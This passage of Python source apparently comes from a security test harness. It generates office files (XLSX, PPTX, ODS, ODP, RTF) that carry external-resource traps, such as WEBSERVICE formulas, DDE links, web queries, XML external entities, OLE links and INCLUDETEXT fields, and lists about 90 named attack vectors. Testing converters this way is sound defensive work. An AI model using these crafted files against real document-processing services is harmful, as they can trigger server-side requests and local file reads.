        'table:last-column-spanned="1" table:last-row-spanned="1"/>'
    )
    cell = (
        f'<table:table-cell table:number-columns-spanned="1" table:number-rows-spanned="1">{source}'
        "</table:table-cell>"
    )
    return odf(_ODS, _ods_table(cell))


def _odp_slide(content: str) -> str:
    return (
        "<office:presentation>"
        '<draw:page draw:name="page1" draw:master-page-name="Default">'
        '<draw:frame svg:x="1cm" svg:y="1cm" svg:width="20cm" svg:height="3cm">'
        f"<draw:text-box><text:p>{FIRST_PAGE_TEXT}</text:p></draw:text-box></draw:frame>"
        f"{content}</draw:page></office:presentation>"
    )


def _odp_frame(content: str) -> str:
    return f'<draw:frame svg:x="1cm" svg:y="5cm" svg:width="6cm" svg:height="6cm">{content}</draw:frame>'


def _odp_linked_image_file(traps: Traps) -> bytes:
    image = f'<draw:image xlink:href="{traps.image_url}" xlink:type="simple"/>'
    return odf(_ODP, _odp_slide(_odp_frame(image)))


def _odp_linked_image_http(traps: Traps) -> bytes:
    image = f'<draw:image xlink:href="{traps.canary("odp-image.png")}" xlink:type="simple"/>'
    return odf(_ODP, _odp_slide(_odp_frame(image)))


def xlsx(
    cells: str,
    *,
    workbook_extra: str = "",
    workbook_rels: list[tuple[str, str, str, bool]] | None = None,
    sheet_rels: list[tuple[str, str, str, bool]] | None = None,
    sheet_extra: str = "",
    parts: dict[str, str] | None = None,
    overrides: dict[str, str] | None = None,
    doctype: str = "",
) -> bytes:
    """A workbook with one sheet; ``cells`` follow the harmless first row."""
    all_overrides = {
        "/xl/workbook.xml": (
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"
        ),
        "/xl/worksheets/sheet1.xml": (
            "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"
        ),
        **(overrides or {}),
    }
    package: dict[str, str | bytes] = {
        "[Content_Types].xml": _content_types(all_overrides),
        "_rels/.rels": _rels([("rId1", f"{OFFICE_RELS}/officeDocument", "xl/workbook.xml", False)]),
        "xl/_rels/workbook.xml.rels": _rels(
            [
                ("rId1", f"{OFFICE_RELS}/worksheet", "worksheets/sheet1.xml", False),
                *(workbook_rels or []),
            ]
        ),
        "xl/workbook.xml": (
            f'{XML_HEADER}<workbook xmlns="{SHEET}" xmlns:r="{OFFICE_RELS}">'
            '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>'
            f"{workbook_extra}</workbook>"
        ),
        "xl/worksheets/sheet1.xml": (
            f'<?xml version="1.0" encoding="UTF-8"?>{doctype}'
            f'<worksheet xmlns="{SHEET}" xmlns:r="{OFFICE_RELS}"><sheetData>'
            f'<row r="1"><c r="A1" t="inlineStr"><is><t>{FIRST_PAGE_TEXT}</t></is></c></row>'
            f"{cells}</sheetData>{sheet_extra}</worksheet>"
        ),
    }
    if sheet_rels is not None:
        package["xl/worksheets/_rels/sheet1.xml.rels"] = _rels(sheet_rels)
    package.update(parts or {})
    return _zip(package)


def _sheet_formula(formula: str) -> str:
    return f'<row r="2"><c r="A2" t="str"><f>{formula}</f></c></row>'


def _xlsx_webservice_http(traps: Traps) -> bytes:
    return xlsx(_sheet_formula(f'_xlfn.WEBSERVICE("{traps.canary("xlsx-web.txt")}")'))


def _xlsx_webservice_file(traps: Traps) -> bytes:
    return xlsx(_sheet_formula(f'_xlfn.WEBSERVICE("{traps.text_url}")'))


def _xlsx_external_link(traps: Traps) -> bytes:
    external = (
        f'{XML_HEADER}<externalLink xmlns="{SHEET}" xmlns:r="{OFFICE_RELS}">'
        '<externalBook r:id="rId1"><sheetNames><sheetName val="marker"/></sheetNames>'
        "</externalBook></externalLink>"
    )
    return xlsx(
        _sheet_formula("[1]marker!$A$1"),
        workbook_extra='<externalReferences><externalReference r:id="rId2"/></externalReferences>',
        workbook_rels=[("rId2", f"{OFFICE_RELS}/externalLink", "externalLinks/externalLink1.xml", False)],
        parts={
            "xl/externalLinks/externalLink1.xml": external,
            "xl/externalLinks/_rels/externalLink1.xml.rels": _rels(
                [("rId1", f"{OFFICE_RELS}/externalLinkPath", traps.csv_url, True)]
            ),
        },
        overrides={
            "/xl/externalLinks/externalLink1.xml": (
                "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"
            )
        },
    )


def _xlsx_dde(traps: Traps) -> bytes:
    external = (
        f'{XML_HEADER}<externalLink xmlns="{SHEET}">'
        f'<ddeLink ddeService="soffice" ddeTopic="{traps.text_url}"><ddeItems>'
        '<ddeItem name="" advise="1"/></ddeItems></ddeLink></externalLink>'
    )
    return xlsx(
        _sheet_formula("[1]!&apos;&apos;"),
        workbook_extra='<externalReferences><externalReference r:id="rId2"/></externalReferences>',
        workbook_rels=[("rId2", f"{OFFICE_RELS}/externalLink", "externalLinks/externalLink1.xml", False)],
        parts={"xl/externalLinks/externalLink1.xml": external},
        overrides={
            "/xl/externalLinks/externalLink1.xml": (
                "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"
            )
        },
    )


def _xlsx_web_query(traps: Traps) -> bytes:
    connections = (
        f'{XML_HEADER}<connections xmlns="{SHEET}"><connection id="1" name="trap" type="4" '
        'refreshedVersion="6" refreshOnLoad="1">'
        f'<webPr sourceData="1" parsePre="1" url="{traps.canary("xlsx-webquery.html")}"/>'
        "</connection></connections>"
    )
    query = (
        f'{XML_HEADER}<queryTable xmlns="{SHEET}" name="trap" refreshOnLoad="1" connectionId="1"/>'
    )
    return xlsx(
        "",
        workbook_rels=[("rId3", f"{OFFICE_RELS}/connections", "connections.xml", False)],
        sheet_rels=[("rId1", f"{OFFICE_RELS}/queryTable", "../queryTables/queryTable1.xml", False)],
        parts={"xl/connections.xml": connections, "xl/queryTables/queryTable1.xml": query},
        overrides={
            "/xl/connections.xml": (
                "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml"
            ),
            "/xl/queryTables/queryTable1.xml": (
                "application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml"
            ),
        },
    )


def _xlsx_linked_image(url: str) -> bytes:
    drawing = (
        f'{XML_HEADER}<xdr:wsDr xmlns:xdr="{SHEET_DRAWING}" xmlns:a="{DRAWING}" '
        f'xmlns:r="{OFFICE_RELS}" xmlns:pic="{PICTURE}"><xdr:oneCellAnchor>'
        '<xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>2</xdr:row>'
        '<xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:ext cx="2000000" cy="2000000"/>'
        '<xdr:pic><xdr:nvPicPr><xdr:cNvPr id="2" name="trap"/><xdr:cNvPicPr/></xdr:nvPicPr>'
        '<xdr:blipFill><a:blip r:link="rId1"/><a:stretch><a:fillRect/></a:stretch></xdr:blipFill>'
        '<xdr:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="2000000" cy="2000000"/></a:xfrm>'
        '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></xdr:spPr></xdr:pic><xdr:clientData/>'
        "</xdr:oneCellAnchor></xdr:wsDr>"
    )
    return xlsx(
        "",
        sheet_extra='<drawing r:id="rId1"/>',
        sheet_rels=[("rId1", f"{OFFICE_RELS}/drawing", "../drawings/drawing1.xml", False)],
        parts={
            "xl/drawings/drawing1.xml": drawing,
            "xl/drawings/_rels/drawing1.xml.rels": _rels(
                [("rId1", f"{OFFICE_RELS}/image", url, True)]
            ),
        },
        overrides={
            "/xl/drawings/drawing1.xml": "application/vnd.openxmlformats-officedocument.drawing+xml"
        },
    )


def _xlsx_linked_image_file(traps: Traps) -> bytes:
    return _xlsx_linked_image(traps.image_url)


def _xlsx_linked_image_http(traps: Traps) -> bytes:
    return _xlsx_linked_image(traps.canary("xlsx-image.png"))


def _xlsx_entity(traps: Traps) -> bytes:
    doctype = f'<!DOCTYPE d [<!ENTITY trap SYSTEM "{traps.text_url}">]>'
    return xlsx(
        '<row r="2"><c r="A2" t="inlineStr"><is><t>&trap;</t></is></c></row>', doctype=doctype
    )


def pptx(shapes: str, *, slide_rels: list[tuple[str, str, str, bool]] | None = None) -> bytes:
    """A one-slide deck holding the harmless probe line plus ``shapes``."""
    overrides = {
        "/ppt/presentation.xml": (
            "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"
        ),
        "/ppt/slides/slide1.xml": (
            "application/vnd.openxmlformats-officedocument.presentationml.slide+xml"
        ),
        "/ppt/slideLayouts/slideLayout1.xml": (
            "application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"
        ),
        "/ppt/slideMasters/slideMaster1.xml": (
            "application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"
        ),
    }
    tree = '<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/>'
    namespaces = f'xmlns:p="{SLIDE}" xmlns:a="{DRAWING}" xmlns:r="{OFFICE_RELS}"'
    probe = (
        '<p:sp><p:nvSpPr><p:cNvPr id="2" name="t"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr>'
        '<p:spPr><a:xfrm><a:off x="100000" y="100000"/><a:ext cx="6000000" cy="800000"/></a:xfrm>'
        '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr>'
        f"<p:txBody><a:bodyPr/><a:p><a:r><a:t>{FIRST_PAGE_TEXT}</a:t></a:r></a:p></p:txBody></p:sp>"
    )
    parts: dict[str, str | bytes] = {
        "[Content_Types].xml": _content_types(overrides),
        "_rels/.rels": _rels(
            [("rId1", f"{OFFICE_RELS}/officeDocument", "ppt/presentation.xml", False)]
        ),
        "ppt/presentation.xml": (
            f"{XML_HEADER}<p:presentation {namespaces}>"
            '<p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId2"/></p:sldMasterIdLst>'
            '<p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst>'
            '<p:sldSz cx="9144000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/>'
            "</p:presentation>"
        ),
        "ppt/_rels/presentation.xml.rels": _rels(
            [
                ("rId1", f"{OFFICE_RELS}/slide", "slides/slide1.xml", False),
                ("rId2", f"{OFFICE_RELS}/slideMaster", "slideMasters/slideMaster1.xml", False),
            ]
        ),
        "ppt/slideMasters/slideMaster1.xml": (
            f"{XML_HEADER}<p:sldMaster {namespaces}><p:cSld><p:spTree>{tree}</p:spTree></p:cSld>"
            '<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" '
            'accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" '
            'folHlink="folHlink"/><p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/>'
            "</p:sldLayoutIdLst></p:sldMaster>"
        ),
        "ppt/slideMasters/_rels/slideMaster1.xml.rels": _rels(
            [("rId1", f"{OFFICE_RELS}/slideLayout", "../slideLayouts/slideLayout1.xml", False)]
        ),
        "ppt/slideLayouts/slideLayout1.xml": (
            f"{XML_HEADER}<p:sldLayout {namespaces}><p:cSld><p:spTree>{tree}</p:spTree></p:cSld>"
            "</p:sldLayout>"
        ),
        "ppt/slideLayouts/_rels/slideLayout1.xml.rels": _rels(
            [("rId1", f"{OFFICE_RELS}/slideMaster", "../slideMasters/slideMaster1.xml", False)]
        ),
        "ppt/slides/slide1.xml": (
            f"{XML_HEADER}<p:sld {namespaces}><p:cSld><p:spTree>{tree}{probe}{shapes}"
            "</p:spTree></p:cSld></p:sld>"
        ),
        "ppt/slides/_rels/slide1.xml.rels": _rels(
            [
                ("rIdLayout", f"{OFFICE_RELS}/slideLayout", "../slideLayouts/slideLayout1.xml", False),
                *(slide_rels or []),
            ]
        ),
    }
    return _zip(parts)


def _pptx_picture(attribute: str) -> str:
    return (
        '<p:pic><p:nvPicPr><p:cNvPr id="3" name="trap"/><p:cNvPicPr/><p:nvPr/></p:nvPicPr>'
        f"<p:blipFill><a:blip {attribute}/><a:stretch><a:fillRect/></a:stretch></p:blipFill>"
        '<p:spPr><a:xfrm><a:off x="100000" y="1000000"/><a:ext cx="2000000" cy="2000000"/></a:xfrm>'
        '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr></p:pic>'
    )


def _pptx_linked_image_file(traps: Traps) -> bytes:
    return pptx(
        _pptx_picture('r:link="rIdTrap"'),
        slide_rels=[("rIdTrap", f"{OFFICE_RELS}/image", traps.image_url, True)],
    )


def _pptx_linked_image_http(traps: Traps) -> bytes:
    return pptx(
        _pptx_picture('r:link="rIdTrap"'),
        slide_rels=[("rIdTrap", f"{OFFICE_RELS}/image", traps.canary("pptx-image.png"), True)],
    )


def _pptx_svg(traps: Traps) -> bytes:
    deck = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(pptx(
        _pptx_picture('r:embed="rIdTrap"'),
        slide_rels=[("rIdTrap", f"{OFFICE_RELS}/image", "../media/trap.svg", False)],
    ))) as base, zipfile.ZipFile(deck, "w", zipfile.ZIP_DEFLATED) as rebuilt:
        for entry in base.infolist():
            content = base.read(entry)
            if entry.filename == "[Content_Types].xml":
                content = content.replace(
                    b'<Default Extension="xml"',
                    b'<Default Extension="svg" ContentType="image/svg+xml"/><Default Extension="xml"',
                )
            rebuilt.writestr(entry.filename, content)
        rebuilt.writestr("ppt/media/trap.svg", _svg_with_image(traps.image_url))
    return deck.getvalue()


def _pptx_hyperlink_typed_image(traps: Traps) -> bytes:
    return pptx(
        _pptx_picture('r:link="rIdTrap"'),
        slide_rels=[("rIdTrap", _HYPERLINK, traps.image_url, True)],
    )


def _pptx_hyperlink_typed_ole_file(traps: Traps) -> bytes:
    return pptx(_pptx_ole_frame(), slide_rels=[("rIdTrap", _HYPERLINK, traps.text_url, True)])


def _pptx_hyperlink_typed_ole_http(traps: Traps) -> bytes:
    return pptx(
        _pptx_ole_frame(), slide_rels=[("rIdTrap", _HYPERLINK, traps.canary("pptx-hyperlink-ole.bin"), True)]
    )


def ole_frame() -> str:
    return _pptx_ole_frame()


def _pptx_ole_frame() -> str:
    return (
        '<p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="4" name="trap"/><p:cNvGraphicFramePr/>'
        "<p:nvPr/></p:nvGraphicFramePr>"
        '<p:xfrm><a:off x="100000" y="1000000"/><a:ext cx="2000000" cy="2000000"/></p:xfrm>'
        '<a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">'
        '<p:oleObj spid="_x0000_s1" name="trap" r:id="rIdTrap" imgW="100" imgH="100" '
        'progId="Word.Document.12"><p:link updateAutomatic="1"/></p:oleObj>'
        "</a:graphicData></a:graphic></p:graphicFrame>"
    )


def _pptx_ole_link(traps: Traps) -> bytes:
    return pptx(
        _pptx_ole_frame(),
        slide_rels=[("rIdTrap", f"{OFFICE_RELS}/oleObject", traps.text_url, True)],
    )


def _pptx_ole_link_http(traps: Traps) -> bytes:
    frame = _pptx_ole_frame()
    return pptx(
        frame, slide_rels=[("rIdTrap", f"{OFFICE_RELS}/oleObject", traps.canary("pptx-ole.bin"), True)]
    )


def _rtf_field(instruction: str) -> bytes:
    escaped = instruction.replace("\\", "\\\\")
    return (
        "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}\\f0 "
        f"{FIRST_PAGE_TEXT}\\par "
        f"{{\\field\\flddirty{{\\*\\fldinst {escaped}}}{{\\fldrslt stale}}}}\\par}}"
    ).encode()


def _rtf_includetext(traps: Traps) -> bytes:
    return _rtf_field(f'INCLUDETEXT "{traps.text_url}"')


def _rtf_includetext_http(traps: Traps) -> bytes:
    return _rtf_field(f'INCLUDETEXT "{traps.canary("rtf-includetext.txt")}"')


def _rtf_includepicture_file(traps: Traps) -> bytes:
    return _rtf_field(f'INCLUDEPICTURE "{traps.image_url}"')


def _rtf_includepicture_http(traps: Traps) -> bytes:
    return _rtf_field(f'INCLUDEPICTURE "{traps.canary("rtf-includepicture.png")}" \\d')


def _rtf_includepicture_plain_http(traps: Traps) -> bytes:
    return _rtf_field(f'INCLUDEPICTURE "{traps.canary("rtf-plain-picture.png")}"')


def _rtf_shape_picture(traps: Traps) -> bytes:
    return (
        "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}\\f0 "
        f"{FIRST_PAGE_TEXT}\\par "
        "{\\shp{\\*\\shpinst\\shpleft0\\shptop0\\shpright2000\\shpbottom2000"
        "{\\sp{\\sn shapeType}{\\sv 75}}"
        f"{{\\sp{{\\sn pibName}}{{\\sv {traps.image_url}}}}}"
        "{\\sp{\\sn pibFlags}{\\sv 10}}}}\\par}"
    ).encode()


def _rtf_template(traps: Traps) -> bytes:
    return (
        "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}"
        f"{{\\*\\template {traps.canary('rtf-template.dotx')}}}"
        f"\\f0 {FIRST_PAGE_TEXT}\\par}}"
    ).encode()


def _rtf_pict_svg(traps: Traps) -> bytes:
    blob = _svg_with_image(traps.image_url).encode().hex()
    return (
        "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}\\f0 "
        f"{FIRST_PAGE_TEXT}\\par "
        f"{{\\pict\\pngblip\\picw2000\\pich2000\\picwgoal2000\\pichgoal2000 {blob}}}\\par}}"
    ).encode()


def _rtf_uppercase_field(traps: Traps) -> bytes:
    return _rtf_field(f'INCLUDEPICTURE "{traps.image_url}"').replace(b"\\fldinst", b"\\FLDINST")


def _rtf_link(traps: Traps) -> bytes:
    return _rtf_field(f'LINK Word.Document.12 "{traps.text_url}" "" \\a')


@dataclass(frozen=True, slots=True)
class Vector:
    name: str
    extension: str
    build: Callable[[Traps], bytes]


VECTORS: tuple[Vector, ...] = (
    Vector("docx-linked-image-file", "docx", _docx_linked_image_file),
    Vector("docx-linked-image-http", "docx", _docx_linked_image_http),
    Vector("docx-vml-image-http", "docx", _docx_vml_image_http),
    Vector("docx-includetext-file", "docx", _docx_includetext),
    Vector("docx-includetext-http", "docx", _docx_includetext_http),
    Vector("docx-includepicture-file", "docx", _docx_includepicture_file),
    Vector("docx-includepicture-http", "docx", _docx_includepicture_http),
    Vector("docx-link-field", "docx", _docx_link_field),
    Vector("docx-altchunk", "docx", _docx_altchunk),
    Vector("docx-subdocument", "docx", _docx_subdocument),
    Vector("docx-attached-template", "docx", _docx_attached_template),
    Vector("docx-ole-link", "docx", _docx_ole_link),
    Vector("docx-svg-image-file", "docx", _docx_svg_file),
    Vector("docx-svg-image-http", "docx", _docx_svg_http),
    Vector("docx-html-chunk-file", "docx", _docx_html_chunk_file),
    Vector("docx-html-chunk-http", "docx", _docx_html_chunk_http),
    Vector("docx-svg-disguised-file", "docx", _docx_svg_disguised),
    Vector("docx-svg-gzip-file", "docx", _docx_svg_gzip),
    Vector("docx-svg-utf16-file", "docx", _docx_svg_utf16),
    Vector("docx-svg-nested-data-file", "docx", _docx_svg_nested_data),
    Vector("docx-vml-image-file", "docx", _docx_vml_file),
    Vector("docx-vml-fill-file", "docx", _docx_vml_fill),
    Vector("docx-embedded-package-file", "docx", _docx_embedded_package),
    Vector("docx-masked-nested-document", "docx", _docx_masked_nested_document),
    Vector("docx-retyped-chunk-file", "docx", _docx_retyped_chunk_file),
    Vector("docx-retyped-chunk-http", "docx", _docx_retyped_chunk_http),
    Vector("docx-unknown-type-chunk-file", "docx", _docx_unknown_type_chunk),
    Vector("docx-utf16-chunk-file", "docx", _docx_utf16_chunk),
    Vector("docx-alternate-content-chunk-file", "docx", _docx_alternate_content_chunk),
    Vector("docx-hyperlink-typed-image-file", "docx", _docx_hyperlink_typed_image_file),
    Vector("docx-hyperlink-typed-image-http", "docx", _docx_hyperlink_typed_image_http),
    Vector("docx-internal-absolute-target", "docx", _docx_internal_absolute_target),
    Vector("docx-entity-file", "docx", _docx_entity),
    Vector("docx-entity-http", "docx", _docx_entity_http),
    Vector("odt-linked-image-file", "odt", _odt_linked_image_file),
    Vector("odt-linked-image-http", "odt", _odt_linked_image_http),
    Vector("odt-section-file", "odt", _odt_section_file),
    Vector("odt-section-http", "odt", _odt_section_http),
    Vector("odt-dde", "odt", _odt_dde),
    Vector("odt-ole-link", "odt", _odt_ole_link),
    Vector("odt-floating-frame", "odt", _odt_floating_frame),
    Vector("odt-font-face", "odt", _odt_font_face),
    Vector("odt-background-image", "odt", _odt_background),
    Vector("odt-svg-image-file", "odt", _odt_svg_file),
    Vector("odt-svg-image-http", "odt", _odt_svg_http),
    Vector("odt-binary-svg-file", "odt", _odt_binary_svg),
    Vector("odt-nested-object-file", "odt", _odt_nested_object),
    Vector("odt-meta-template-http", "odt", _odt_meta_template),
    Vector("odt-xforms-http", "odt", _odt_xforms_http),
    Vector("odt-xforms-file", "odt", _odt_xforms_file),
    Vector("odt-encoded-traversal", "odt", _odt_encoded_traversal),
    Vector("odt-entity-file", "odt", _odt_entity),
    Vector("odt-macro-on-load", "odt", _odt_macro),
    Vector("ods-webservice-http", "ods", _ods_webservice_http),
    Vector("ods-webservice-file", "ods", _ods_webservice_file),
    Vector("ods-dde", "ods", _ods_dde),
    Vector("ods-external-reference", "ods", _ods_external_reference),
    Vector("ods-table-source", "ods", _ods_table_source),
    Vector("ods-cell-range-link", "ods", _ods_cell_range_link),
    Vector("odp-linked-image-file", "odp", _odp_linked_image_file),
    Vector("odp-linked-image-http", "odp", _odp_linked_image_http),
    Vector("xlsx-webservice-http", "xlsx", _xlsx_webservice_http),
    Vector("xlsx-webservice-file", "xlsx", _xlsx_webservice_file),
    Vector("xlsx-external-link", "xlsx", _xlsx_external_link),
    Vector("xlsx-dde", "xlsx", _xlsx_dde),
    Vector("xlsx-web-query", "xlsx", _xlsx_web_query),
    Vector("xlsx-linked-image-file", "xlsx", _xlsx_linked_image_file),
    Vector("xlsx-linked-image-http", "xlsx", _xlsx_linked_image_http),
    Vector("xlsx-entity-file", "xlsx", _xlsx_entity),
    Vector("pptx-linked-image-file", "pptx", _pptx_linked_image_file),
    Vector("pptx-linked-image-http", "pptx", _pptx_linked_image_http),
    Vector("pptx-svg-image-file", "pptx", _pptx_svg),
    Vector("pptx-hyperlink-typed-image-file", "pptx", _pptx_hyperlink_typed_image),
    Vector("pptx-hyperlink-typed-ole-file", "pptx", _pptx_hyperlink_typed_ole_file),
    Vector("pptx-hyperlink-typed-ole-http", "pptx", _pptx_hyperlink_typed_ole_http),
    Vector("pptx-ole-link-file", "pptx", _pptx_ole_link),
    Vector("pptx-ole-link-http", "pptx", _pptx_ole_link_http),
    Vector("rtf-includetext-file", "rtf", _rtf_includetext),
    Vector("rtf-includetext-http", "rtf", _rtf_includetext_http),
    Vector("rtf-includepicture-file", "rtf", _rtf_includepicture_file),
    Vector("rtf-includepicture-http", "rtf", _rtf_includepicture_http),
    Vector("rtf-includepicture-plain-http", "rtf", _rtf_includepicture_plain_http),
    Vector("rtf-shape-picture", "rtf", _rtf_shape_picture),
    Vector("rtf-template", "rtf", _rtf_template),
    Vector("rtf-uppercase-field-file", "rtf", _rtf_uppercase_field),
    Vector("rtf-pict-svg-file", "rtf", _rtf_pict_svg),
    Vector("rtf-link-field", "rtf", _rtf_link),
)
